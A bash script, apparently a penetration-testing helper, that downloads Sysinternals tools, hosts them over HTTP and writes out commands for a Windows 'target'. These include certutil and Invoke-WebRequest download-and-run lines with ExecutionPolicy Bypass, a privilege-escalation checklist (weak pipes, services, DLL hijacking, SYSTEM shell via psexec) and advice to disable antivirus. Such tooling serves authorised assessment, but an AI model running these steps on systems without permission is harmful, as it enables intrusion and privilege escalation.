#!/bin/bash

# Sysinternals Tools Download & Server Script
# Downloads essential Sysinternals tools and serves them via HTTP

set -e

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}Sysinternals Tools Download & Server Script${NC}"
echo -e "${CYAN}Perfect for Offline/Isolated Machine Transfers${NC}"
echo ""

# Get available IP addresses
echo -e "${YELLOW}Available IP addresses:${NC}"
ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | nl -w2 -s'. '
echo ""

# Prompt for IP selection
read -p "Select IP address number (or press Enter for first non-loopback): " ip_choice

if [ -z "$ip_choice" ]; then
    SERVER_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v "127.0.0.1" | head -n1)
else
    SERVER_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | sed -n "${ip_choice}p")
fi

if [ -z "$SERVER_IP" ]; then
    echo -e "${RED}Error: Could not determine IP address${NC}"
    exit 1
fi

echo -e "${GREEN}Selected IP: $SERVER_IP${NC}"
echo ""

# Configuration
TOOLS_DIR="sysinternals_tools"
DOWNLOAD_DIR="$TOOLS_DIR/downloads"
PORT=$(shuf -i 8000-9999 -n 1)

# Essential Sysinternals tools
declare -A TOOLS=(
    ["accesschk.exe"]="https://live.sysinternals.com/accesschk.exe"
    ["accesschk64.exe"]="https://live.sysinternals.com/accesschk64.exe"
    ["procmon.exe"]="https://live.sysinternals.com/Procmon.exe"
    ["procmon64.exe"]="https://live.sysinternals.com/Procmon64.exe"
    ["autoruns.exe"]="https://live.sysinternals.com/autoruns.exe"
    ["autoruns64.exe"]="https://live.sysinternals.com/autoruns64.exe"
    ["autorunsc.exe"]="https://live.sysinternals.com/autorunsc.exe"
    ["autorunsc64.exe"]="https://live.sysinternals.com/autorunsc64.exe"
    ["procexp.exe"]="https://live.sysinternals.com/procexp.exe"
    ["procexp64.exe"]="https://live.sysinternals.com/procexp64.exe"
    ["sigcheck.exe"]="https://live.sysinternals.com/sigcheck.exe"
    ["sigcheck64.exe"]="https://live.sysinternals.com/sigcheck64.exe"
    ["psexec.exe"]="https://live.sysinternals.com/PsExec.exe"
    ["psexec64.exe"]="https://live.sysinternals.com/PsExec64.exe"
    ["pslist.exe"]="https://live.sysinternals.com/pslist.exe"
    ["pslist64.exe"]="https://live.sysinternals.com/pslist64.exe"
    ["handle.exe"]="https://live.sysinternals.com/handle.exe"
    ["handle64.exe"]="https://live.sysinternals.com/handle64.exe"
    ["strings.exe"]="https://live.sysinternals.com/strings.exe"
    ["strings64.exe"]="https://live.sysinternals.com/strings64.exe"
    ["tcpview.exe"]="https://live.sysinternals.com/Tcpview.exe"
    ["sysmon.exe"]="https://live.sysinternals.com/Sysmon.exe"
    ["sysmon64.exe"]="https://live.sysinternals.com/Sysmon64.exe"
)

# Create directory structure
echo -e "${YELLOW}Creating directory structure...${NC}"
mkdir -p "$DOWNLOAD_DIR"
cd "$TOOLS_DIR"

# Download tools
echo -e "${YELLOW}Downloading Sysinternals tools...${NC}"
FAILED_DOWNLOADS=()

for tool in "${!TOOLS[@]}"; do
    url="${TOOLS[$tool]}"
    if [ -f "downloads/$tool" ]; then
        echo -e "${GREEN}[OK] $tool already exists${NC}"
    else
        echo -e "${BLUE}Downloading $tool...${NC}"
        if wget -q --show-progress -O "downloads/$tool" "$url" 2>/dev/null; then
            echo -e "${GREEN}[OK] Downloaded $tool${NC}"
        else
            echo -e "${RED}[FAIL] Failed to download $tool${NC}"
            FAILED_DOWNLOADS+=("$tool")
        fi
    fi
done

# Summary
echo ""
echo -e "${GREEN}Download Summary${NC}"
TOTAL_TOOLS=${#TOOLS[@]}
SUCCESSFUL=$((TOTAL_TOOLS - ${#FAILED_DOWNLOADS[@]}))
echo -e "${GREEN}Successfully downloaded: $SUCCESSFUL/$TOTAL_TOOLS tools${NC}"

if [ ${#FAILED_DOWNLOADS[@]} -gt 0 ]; then
    echo -e "${RED}Failed downloads: ${FAILED_DOWNLOADS[*]}${NC}"
fi
echo ""

# Generate transfer commands
COMMANDS_FILE="transfer_commands.txt"
echo -e "${YELLOW}Generating transfer commands...${NC}"

cat > "$COMMANDS_FILE" << 'EOL'
===============================================================================
SYSINTERNALS TOOLS - TRANSFER COMMANDS
===============================================================================

Server Information:
EOL

echo "  URL: http://${SERVER_IP}:${PORT}" >> "$COMMANDS_FILE"
echo "  IP: ${SERVER_IP}" >> "$COMMANDS_FILE"
echo "  Port: ${PORT}" >> "$COMMANDS_FILE"

cat >> "$COMMANDS_FILE" << 'EOL'

===============================================================================
STEP 1: INITIAL IPC ENUMERATION (Run BEFORE downloading tools)
===============================================================================

PowerShell One-Liner (Copy and Paste):
EOL

cat >> "$COMMANDS_FILE" << 'EOL'

Write-Host "[*] IPC Enumeration Started" -ForegroundColor Cyan; Write-Host "`n=== NETWORK SOCKETS ===" -ForegroundColor Yellow; netstat -ano | Select-String "LISTENING|ESTABLISHED"; Write-Host "`n=== NAMED PIPES ===" -ForegroundColor Yellow; Get-ChildItem \\.\pipe\ -ErrorAction SilentlyContinue | Select-Object Name | Format-Table -AutoSize; Write-Host "`n=== MAILSLOTS ===" -ForegroundColor Yellow; Get-ChildItem \\.\mailslot\ -ErrorAction SilentlyContinue | Select-Object Name | Format-Table -AutoSize; Write-Host "`n=== RPC PROCESSES ===" -ForegroundColor Yellow; Get-WmiObject Win32_Process | Where-Object {$_.Name -like "*rpc*"} | Select-Object ProcessId,Name,CommandLine; Write-Host "`n=== COM/DCOM OBJECTS ===" -ForegroundColor Yellow; Get-CimInstance Win32_DCOMApplication | Select-Object -First 20 Name,AppID | Format-Table -AutoSize; Write-Host "`n=== RUNNING SERVICES ===" -ForegroundColor Yellow; Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name,DisplayName,Status | Format-Table -AutoSize; Write-Host "`n=== LOCALHOST LISTENERS ===" -ForegroundColor Yellow; netstat -ano | Select-String "127.0.0.1.*LISTENING"; Write-Host "`n=== SCHEDULED TASKS ===" -ForegroundColor Yellow; Get-ScheduledTask | Where-Object {$_.State -eq 'Ready' -or $_.State -eq 'Running'} | Select-Object TaskName,State | Format-Table -AutoSize; Write-Host "`n[+] Enumeration Complete!" -ForegroundColor Green

CMD Alternative (Limited):

echo === NETWORK SOCKETS === && netstat -ano && echo === NAMED PIPES === && dir \\.\pipe\ && echo === LOCALHOST LISTENERS === && netstat -ano | findstr "127.0.0.1.*LISTENING"

OR Download and Run Full Enumeration Script:
EOL

echo "Invoke-WebRequest -Uri http://${SERVER_IP}:${PORT}/enum_ipc.ps1 -OutFile enum_ipc.ps1" >> "$COMMANDS_FILE"
echo "powershell -ExecutionPolicy Bypass -File enum_ipc.ps1" >> "$COMMANDS_FILE"

cat >> "$COMMANDS_FILE" << 'EOL'

===============================================================================
STEP 2: DOWNLOAD TOOLS
===============================================================================

Method 1: PowerShell - Download Individual Tools
-------------------------------------------------------------------------------

EOL

# Individual tool download commands
for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "# $tool" >> "$COMMANDS_FILE"
        echo "Invoke-WebRequest -Uri http://${SERVER_IP}:${PORT}/$tool -OutFile $tool" >> "$COMMANDS_FILE"
        echo "" >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << 'EOL'

Method 2: PowerShell - Download All Tools
-------------------------------------------------------------------------------

$tools = @(
EOL

for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "    \"$tool\"," >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << MULTILINE
)
foreach (\$tool in \$tools) {
    Invoke-WebRequest -Uri "http://${SERVER_IP}:${PORT}/\$tool" -OutFile \$tool
    Write-Host "Downloaded: \$tool" -ForegroundColor Green
}

Method 3: certutil (Windows Alternative)
-------------------------------------------------------------------------------

MULTILINE

for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "certutil -urlcache -f http://${SERVER_IP}:${PORT}/$tool $tool" >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << 'EOL'

Method 4: wget (Cross-platform)
-------------------------------------------------------------------------------

EOL

for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "wget http://${SERVER_IP}:${PORT}/$tool" >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << 'EOL'

Method 5: curl (Cross-platform)
-------------------------------------------------------------------------------

EOL

for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "curl -O http://${SERVER_IP}:${PORT}/$tool" >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << 'EOL'

Method 6: Batch Script
-------------------------------------------------------------------------------
Save as download_tools.bat and run:

@echo off
echo Downloading Sysinternals Tools...
EOL

for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "powershell -Command \"Invoke-WebRequest -Uri 'http://${SERVER_IP}:${PORT}/$tool' -OutFile '$tool'\"" >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << 'EOL'
echo All tools downloaded!
pause

===============================================================================
STEP 3: DEEP ANALYSIS - Named Pipes & IPC
===============================================================================

Check All Named Pipe Permissions:
accesschk.exe /accepteula -w \\.\pipe\* -v

Find Pipes with Everyone/Users Write Access:
accesschk.exe /accepteula \\.\pipe\* -v | findstr /i "everyone users"

Check Specific Named Pipe:
accesschk.exe -accepteula -w \\.\pipe\[PIPE_NAME] -v

Enumerate Pipe ACLs with PowerShell:
Get-ChildItem \\.\pipe\ | ForEach-Object { $pipeName = $_.FullName; try { $acl = Get-Acl $pipeName -ErrorAction Stop; Write-Host "`nPipe: $pipeName" -ForegroundColor Cyan; $acl.Access | Format-Table IdentityReference,FileSystemRights,AccessControlType } catch {} }

===============================================================================
QUICK USAGE EXAMPLES
===============================================================================

Service Permission Checks:
  accesschk.exe -uwcqv "Authenticated Users" * /accepteula
  accesschk64.exe -uwcqv * /accepteula

Find Writable Directories (DLL Hijacking):
  accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula
  accesschk.exe -uwdqs Users c:\ /accepteula

Find Writable Files in Program Files:
  accesschk.exe -uwqs "Everyone" "c:\Program Files\*" /accepteula

Monitor Process Activity:
  procmon.exe /accepteula /quiet /minimized /backingfile procmon.pml

Check Autoruns:
  autorunsc.exe -a * -c -h -s -v /accepteula

Verify File Signatures:
  sigcheck.exe -u -e c:\windows\system32
  sigcheck.exe -u -e "c:\Program Files\" -s

Process Information:
  pslist.exe -x

Check Open Handles:
  handle.exe
  handle.exe \\.\pipe\[PIPE_NAME]

Network Connections:
  tcpview.exe

Search Strings:
  strings.exe -n 8 suspicious.exe

Execute as SYSTEM:
  psexec.exe -i -s cmd.exe

===============================================================================
PRIVILEGE ESCALATION WORKFLOW
===============================================================================

1. INITIAL ENUMERATION:
   - Run IPC enumeration one-liner (Step 1)
   - Note localhost listeners, named pipes, services

2. DEEP PIPE ANALYSIS:
   - accesschk.exe -w \\.\pipe\* -v /accepteula
   - Look for pipes with weak permissions

3. SERVICE ENUMERATION:
   - accesschk.exe -uwcqv "Authenticated Users" * /accepteula
   - Find unquoted service paths

4. DLL HIJACKING:
   - Run procmon.exe with filters
   - Find missing DLLs in writable directories

5. FILE/DIRECTORY PERMISSIONS:
   - accesschk.exe -uwdqs Users c:\ /accepteula
   - Check Program Files, Windows, System32

6. AUTORUNS/PERSISTENCE:
   - autorunsc.exe -a * -c -h -s -v /accepteula
   - Find writable locations

===============================================================================
NOTES
===============================================================================

- Run PowerShell as Administrator if downloads fail
- Disable AV temporarily if tools are blocked
- Use 32-bit or 64-bit versions based on system architecture
- Accept EULA with /accepteula flag on first run
- Check Windows Event Logs for security events

===============================================================================
EOL

echo -e "${GREEN}Transfer commands saved to: $COMMANDS_FILE${NC}"

# Create enumeration PowerShell script
ENUM_SCRIPT="enum_ipc.ps1"
cat > "$ENUM_SCRIPT" << 'ENUMSCRIPT'
# Windows IPC & Communication Enumeration Script
# Run this before downloading Sysinternals tools

Write-Host "`n===============================================================================" -ForegroundColor Cyan
Write-Host "Windows IPC & Communication Enumeration" -ForegroundColor Cyan
Write-Host "Pre-Sysinternals Quick Assessment" -ForegroundColor Cyan
Write-Host "===============================================================================`n" -ForegroundColor Cyan

Write-Host "[*] Starting enumeration at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Yellow
Write-Host "[*] Enumerating: Network Sockets, Named Pipes, RPC, COM, Services, Tasks`n" -ForegroundColor Yellow

# Network Sockets
Write-Host "===============================================================================" -ForegroundColor Green
Write-Host "1. NETWORK SOCKETS & CONNECTIONS" -ForegroundColor Green
Write-Host "===============================================================================" -ForegroundColor Green
Write-Host "[*] Listening Ports:" -ForegroundColor Cyan
netstat -ano | Select-String "LISTENING" | ForEach-Object { 
    if ($_ -match "127\.0\.0\.1") { 
        Write-Host $_ -ForegroundColor Red 
    } else { 
        Write-Host $_ 
    } 
}

Write-Host "`n[*] Established Connections (Top 10):" -ForegroundColor Cyan
netstat -ano | Select-String "ESTABLISHED" | Select-Object -First 10

# Named Pipes
Write-Host "`n===============================================================================" -ForegroundColor Green
Write-Host "2. NAMED PIPES (IPC Mechanism)" -ForegroundColor Green
Write-Host "===============================================================================" -ForegroundColor Green
try {
    $pipes = Get-ChildItem \\.\pipe\ -ErrorAction SilentlyContinue | Select-Object Name
    Write-Host "[+] Found $($pipes.Count) named pipes" -ForegroundColor Yellow
    $pipes | Select-Object -First 30 | Format-Table -AutoSize
    Write-Host "[!] Use accesschk.exe to check pipe permissions after download" -ForegroundColor Yellow
} catch {
    Write-Host "[-] Error enumerating pipes: $_" -ForegroundColor Red
}

# Mailslots
Write-Host "`n===============================================================================" -ForegroundColor Green
Write-Host "3. MAILSLOTS (One-way IPC)" -ForegroundColor Green
Write-Host "===============================================================================" -ForegroundColor Green
try {
    $mailslots = Get-ChildItem \\.\mailslot\ -ErrorAction SilentlyContinue
    if ($mailslots) {
        Write-Host "[+] Found mailslots:" -ForegroundColor Yellow
        $mailslots | Select-Object Name | Format-Table -AutoSize
    } else {
        Write-Host "[*] No mailslots found" -ForegroundColor Gray
    }
} catch {
    Write-Host "[*] No mailslots accessible" -ForegroundColor Gray
}

# RPC Processes
Write-Host "`n===============================================================================" -ForegroundColor Green
Write-Host "4. RPC-RELATED PROCESSES" -ForegroundColor Green
Write-Host "===============================================================================" -ForegroundColor Green
$rpcProcs = Get-WmiObject Win32_Process | Where-Object {$_.Name -like "*rpc*" -or $_.CommandLine -like "*rpc*"}
if ($rpcProcs) {
    $rpcProcs | Select-Object ProcessId,Name,CommandLine | Format-Table -AutoSize
} else {
    Write-Host "[*] No obvious RPC processes found" -ForegroundColor Gray
}

# COM/DCOM Objects
Write-Host "`n===============================================================================" -ForegroundColor Green
Write-Host "5. COM/DCOM APPLICATIONS (Sample)" -ForegroundColor Green
Write-Host "===============================================================================" -ForegroundColor Green
try {
    Get-CimInstance Win32_DCOMApplication -ErrorAction SilentlyContinue | 
        Select-Object -First 15 Name,AppID | 
        Format-Table -AutoSize
} catch {
    Write-Host "[*] Unable to enumerate DCOM apps" -ForegroundColor Gray
}

# Services
Write-Host "`n===============================================================================" -ForegroundColor Green
Write-Host "6. RUNNING SERVICES (Potential IPC Vectors)" -ForegroundColor Green
Write-Host "===============================================================================" -ForegroundColor Green
$services = Get-Service | Where-Object {$_.Status -eq 'Running'} | 
    Select-Object Name,DisplayName,Status

Write-Host "[+] Found $($services.Count) running services" -ForegroundColor Yellow
$services | Select-Object -First 20 | Format-Table -AutoSize
Write-Host "[!] Use accesschk.exe to find weak service permissions" -ForegroundColor Yellow

# Localhost Listeners
Write-Host "`n===============================================================================" -ForegroundColor Green
Write-Host "7. LOCALHOST-ONLY LISTENERS (High Priority)" -ForegroundColor Green
Write-Host "===============================================================================" -ForegroundColor Green
Write-Host "[!] These are often insecure internal services:" -ForegroundColor Red
netstat -ano | Select-String "127\.0\.0\.1.*LISTENING" | ForEach-Object {
    Write-Host $_ -ForegroundColor Red
}

# Process Memory
Write-Host "`n===============================================================================" -ForegroundColor Green
Write-Host "8. TOP PROCESSES BY MEMORY" -ForegroundColor Green
Write-Host "===============================================================================" -ForegroundColor Green
Get-WmiObject Win32_Process | 
    Select-Object ProcessId,Name,@{N='WorkingSetMB';E={[math]::Round($_.WorkingSetSize/1MB,2)}} | 
    Sort-Object WorkingSetMB -Descending | 
    Select-Object -First 10 | 
    Format-Table -AutoSize

# Scheduled Tasks
Write-Host "`n===============================================================================" -ForegroundColor Green
Write-Host "9. SCHEDULED TASKS (Potential Abuse Vectors)" -ForegroundColor Green
Write-Host "===============================================================================" -ForegroundColor Green
$tasks = Get-ScheduledTask | Where-Object {$_.State -eq 'Ready' -or $_.State -eq 'Running'} | 
    Select-Object TaskName,State,TaskPath

Write-Host "[+] Found $($tasks.Count) active/ready tasks" -ForegroundColor Yellow
$tasks | Select-Object -First 20 | Format-Table -AutoSize

# Summary
Write-Host "`n===============================================================================" -ForegroundColor Cyan
Write-Host "ENUMERATION COMPLETE" -ForegroundColor Cyan
Write-Host "===============================================================================" -ForegroundColor Cyan
Write-Host "`n[+] Key Findings to Investigate:" -ForegroundColor Green
Write-Host "    1. Named Pipes: Check permissions with accesschk.exe" -ForegroundColor Yellow
Write-Host "    2. Localhost Listeners: Try connecting to exposed services" -ForegroundColor Yellow
Write-Host "    3. Services: Look for weak permissions or unquoted paths" -ForegroundColor Yellow
Write-Host "    4. Scheduled Tasks: Find tasks with writable paths" -ForegroundColor Yellow
Write-Host "`n[*] Next Step: Download Sysinternals tools for deep analysis" -ForegroundColor Cyan
Write-Host "[*] Completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Yellow
ENUMSCRIPT

echo -e "${GREEN}Enumeration script saved to: $ENUM_SCRIPT${NC}"

# Copy enum script to downloads
cp "$ENUM_SCRIPT" "downloads/"
echo -e "${GREEN}Enumeration script added to downloads${NC}"

# Setup complete
echo ""
echo -e "${GREEN}===============================================================================${NC}"
echo -e "${GREEN}Setup Complete${NC}"
echo -e "${GREEN}===============================================================================${NC}"
echo ""
echo -e "${YELLOW}Server Configuration:${NC}"
echo -e "  IP Address: ${BLUE}$SERVER_IP${NC}"
echo -e "  Port: ${BLUE}$PORT${NC}"
echo -e "  Base URL: ${BLUE}http://${SERVER_IP}:${PORT}${NC}"
echo ""
echo -e "${CYAN}Quick Start Guide:${NC}"
echo -e "  1. Run IPC enumeration on target (see commands below)"
echo -e "  2. View transfer commands: ${BLUE}cat $COMMANDS_FILE${NC}"
echo -e "  3. Download tools using methods from transfer_commands.txt"
echo -e "  4. Analyze results with accesschk.exe and other tools"
echo ""
echo -e "${RED}===============================================================================${NC}"
echo -e "${RED}COPY THIS FIRST - Run on Target BEFORE Downloading Tools${NC}"
echo -e "${RED}===============================================================================${NC}"
echo ""
echo -e "${BLUE}PowerShell IPC Enumeration One-Liner:${NC}"
echo ""
cat << 'ONELINER'
Write-Host "[*] IPC Enumeration Started" -ForegroundColor Cyan; Write-Host "`n=== NETWORK SOCKETS ===" -ForegroundColor Yellow; netstat -ano | Select-String "LISTENING|ESTABLISHED"; Write-Host "`n=== NAMED PIPES ===" -ForegroundColor Yellow; Get-ChildItem \\.\pipe\ -ErrorAction SilentlyContinue | Select-Object Name | Format-Table -AutoSize; Write-Host "`n=== MAILSLOTS ===" -ForegroundColor Yellow; Get-ChildItem \\.\mailslot\ -ErrorAction SilentlyContinue | Select-Object Name | Format-Table -AutoSize; Write-Host "`n=== RPC PROCESSES ===" -ForegroundColor Yellow; Get-WmiObject Win32_Process | Where-Object {$_.Name -like "*rpc*"} | Select-Object ProcessId,Name,CommandLine; Write-Host "`n=== COM/DCOM OBJECTS ===" -ForegroundColor Yellow; Get-CimInstance Win32_DCOMApplication | Select-Object -First 20 Name,AppID | Format-Table -AutoSize; Write-Host "`n=== RUNNING SERVICES ===" -ForegroundColor Yellow; Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name,DisplayName,Status | Format-Table -AutoSize; Write-Host "`n=== LOCALHOST LISTENERS ===" -ForegroundColor Yellow; netstat -ano | Select-String "127.0.0.1.*LISTENING"; Write-Host "`n=== SCHEDULED TASKS ===" -ForegroundColor Yellow; Get-ScheduledTask | Where-Object {$_.State -eq 'Ready' -or $_.State -eq 'Running'} | Select-Object TaskName,State | Format-Table -AutoSize; Write-Host "`n[+] Enumeration Complete!" -ForegroundColor Green
ONELINER
echo ""
echo -e "${BLUE}CMD Alternative (Limited):${NC}"
echo ""
echo 'echo === NETWORK SOCKETS === && netstat -ano && echo === NAMED PIPES === && dir \\.\pipe\ && echo === LOCALHOST LISTENERS === && netstat -ano | findstr "127.0.0.1.*LISTENING"'
echo ""
echo -e "${BLUE}OR Download Full Script:${NC}"
echo ""
echo "Invoke-WebRequest -Uri http://${SERVER_IP}:${PORT}/enum_ipc.ps1 -OutFile enum_ipc.ps1"
echo "powershell -ExecutionPolicy Bypass -File enum_ipc.ps1"
echo ""
echo -e "${GREEN}===============================================================================${NC}"
echo ""
echo -e "${BLUE}Available Downloads:${NC}"
echo -e "${GREEN}  - enum_ipc.ps1 (IPC Enumeration Script)${NC}"
ls -lh downloads/*.exe 2>/dev/null | awk '{printf "  - %s (%s)\n", $9, $5}' | sed 's|downloads/||g'
echo ""
echo -e "${YELLOW}Starting HTTP server on port $PORT...${NC}"
echo ""

# Start server
cd downloads
python3 -m http.server $PORT
